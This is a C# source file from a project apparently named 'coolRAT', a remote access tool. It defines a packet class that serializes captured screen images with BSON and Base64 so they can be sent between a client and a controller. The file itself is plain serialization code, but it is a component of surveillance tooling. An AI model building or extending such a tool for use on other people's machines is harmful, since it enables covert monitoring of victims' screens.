using Newtonsoft.Json;
using Newtonsoft.Json.Bson;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Text;

namespace coolRAT.Libs.Packets
{
    public class BitmapWrapper
    {
        public Bitmap Bitmap;

        public BitmapWrapper(Bitmap bitmap)
        {
            Bitmap = bitmap ?? throw new ArgumentNullException(nameof(bitmap));
        }
    }
    public class ScreenFrame : Packet
    {
        public Bitmap Frame;
        public string FrameSerialized;

        public ScreenFrame(Guid uniqueClientId, Bitmap frame) : base(uniqueClientId)
        {
            Frame = frame ?? throw new ArgumentNullException(nameof(frame));
            Type = "ScreenFrame";
        }

        public new string Serialize()
        {
            MemoryStream ms = new MemoryStream();
            using (BsonWriter writer = new BsonWriter(ms))
            {
                JsonSerializer serializer = new JsonSerializer();
                serializer.Serialize(writer, new BitmapWrapper(Frame));
            }

            string frame_wrapped = Convert.ToBase64String(ms.ToArray());
            FrameSerialized = frame_wrapped;
            return JsonConvert.SerializeObject(this);
        }

        public static new ScreenFrame Deserialize(string packet_raw)
        {
            ScreenFrame framepacket = JsonConvert.DeserializeObject<ScreenFrame>(packet_raw);
            byte[] frame_data = Convert.FromBase64String(framepacket.FrameSerialized);
            MemoryStream ms = new MemoryStream(frame_data);
            using (BsonReader reader = new BsonReader(ms))
            {
                JsonSerializer serializer = new JsonSerializer();
                BitmapWrapper wrapper = serializer.Deserialize<BitmapWrapper>(reader);
                framepacket.FrameSerialized = null;
                framepacket.Frame = wrapper.Bitmap;
            }

            return framepacket;
        }
    }
}
